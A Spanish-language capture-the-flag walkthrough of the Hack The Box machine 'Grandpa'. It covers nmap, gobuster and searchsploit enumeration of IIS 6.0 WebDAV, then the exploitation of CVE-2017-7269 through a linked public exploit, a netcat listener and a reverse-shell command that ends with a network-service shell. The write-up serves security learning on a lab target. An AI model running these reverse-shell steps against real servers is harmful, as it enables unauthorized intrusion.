# Grandpa ![Avatar](https://www.hackthebox.eu/storage/avatars/381683fd107da11f1dc916401ae8aee0_thumb.png)

## Initial Scan
```
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Date: Fri, 21 Aug 2020 19:33:37 GMT
|   WebDAV type: Unknown
|   Server Type: Microsoft-IIS/6.0
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
```
## Enum
Empecemos por el servicio HTTP :v
#### Gobuster
```
/_private (Status: 403)
/_vti_pvt (Status: 403)
/_vti_cnf (Status: 403)
/_vti_log (Status: 403)
/_vti_bin (Status: 301)
/_vti_txt (Status: 403)
/aspnet_client (Status: 403)
/images (Status: 301)
/_vti_bin/_vti_adm/admin.dll (Status: 200)
/_vti_bin/_vti_aut/author.dll (Status: 200)
/_vti_bin/shtml.dll (Status: 200)
```
### Searchsploit
Con el scaneo de nmap vemos la versión del servicio web,si buscamos vulnerabilidades conocidas del servicio encontramos las siguientes
```
----------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                   |  Path
----------------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft IIS 4.0/5.0/6.0 - Internal IP Address/Internal Network Name Disclosure                                 | windows/remote/21057.txt
Microsoft IIS 5.0/6.0 FTP Server (Windows 2000) - Remote Stack Overflow                                          | windows/remote/9541.pl
Microsoft IIS 5.0/6.0 FTP Server - Stack Exhaustion Denial of Service                                            | windows/dos/9587.txt
Microsoft IIS 6.0 - '/AUX / '.aspx' Remote Denial of Service                                                     | windows/dos/3965.pl
Microsoft IIS 6.0 - ASP Stack Overflow Stack Exhaustion (Denial of Service) (MS10-065)                           | windows/dos/15167.txt
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                                         | windows/remote/41738.py
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)                                                      | windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)                                                      | windows/remote/8806.pl
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)                                                  | windows/remote/8754.patch
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (PHP)                                                    | windows/remote/8765.php
Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                                                         | windows/remote/19033.txt
----------------------------------------------------------------------------------------------------------------- ---------------------------------
```
Dado que no tenemos un FTP server activo en la máquina y no parece haber PHP se nos reducen los candidatos significativamente, no hemos encontrado aun ningun formulario de login asi que el mas indicado probablemente sea el 41738.py
Buscamos un exploit y encontramos el siguiente:
```
https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/master/iis6%20reverse%20shell
```
A partir de aquí el resto es sencillo
*1 Abrimos un listener con netcat
```
nc -lvnp 4444
```

* 2. Lanzamos el exploit (Este a veces falla, si tras 3 intentos sigue sin ir vota para reset
```
python2.7 revshell.py 10.10.10.14 80 LHOST LPORT
```
* 3. Disfruta de tu shell como authority network
```
c:\windows\system32\inetsrv>whoami
nt authority\network service
```

